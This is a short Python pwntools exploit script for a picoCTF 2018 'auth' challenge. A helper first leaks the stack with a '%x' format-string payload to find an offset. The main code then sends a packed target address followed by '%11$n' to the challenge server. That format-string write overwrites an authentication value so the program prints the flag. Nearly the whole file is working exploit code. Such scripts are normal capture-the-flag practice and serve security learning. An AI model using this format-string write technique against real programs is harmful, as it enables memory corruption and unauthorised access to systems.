#coding=utf-8
from pwn import *

def test():
  #r = remote('2018shell.picoctf.com', 52398)
  r = process('./auth')
  r.recvuntil('Would you like to read the flag? (yes/no)')

  payload = 'AAAA '
  for i in range(30):
    payload += '%x '
  r.sendline(payload)

  res = r.recvall(1)
  print res
  res = res.split('\n')[3].strip()
  print res

r = remote('2018shell.picoctf.com', 52398)
#r = process('./auth')
r.recvuntil('Would you like to read the flag? (yes/no)')

target_addr = 0x804a04c
payload = p32(target_addr) + '%11$n'

r.sendline(payload)
res = r.recvall(1)
print res

